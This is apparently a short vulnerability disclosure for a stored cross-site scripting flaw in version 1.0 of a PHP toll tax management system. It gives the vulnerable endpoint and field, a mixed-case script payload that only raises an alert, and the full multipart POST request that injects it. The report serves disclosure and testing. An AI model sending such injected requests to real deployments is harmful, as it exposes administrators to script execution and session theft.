# toll-tax-management-system v1.0 - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15304/toll-tax-management-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /ttms/classes/Master.php?f=save_recipient

Vulnerability location: /ttms/classes/Master.php?f=save_recipient, vehicle_name

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST /ttms/classes/Master.php?f=save_recipient HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------24404946016694802869537324
Content-Length: 870
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/ttms/admin/?page=recipients/manage_recipient
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="id"


-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="category_id"

2
-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="toll_id"

2
-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="vehicle_name"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="vehicle_registration"

asd
-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="owner"

asd
-----------------------------24404946016694802869537324
Content-Disposition: form-data; name="cost"

100
-----------------------------24404946016694802869537324--

```

![](https://github.com/mikeccltt/bug_report_CVE/blob/main/toll-tax-management-system/xss.gif?raw=true)
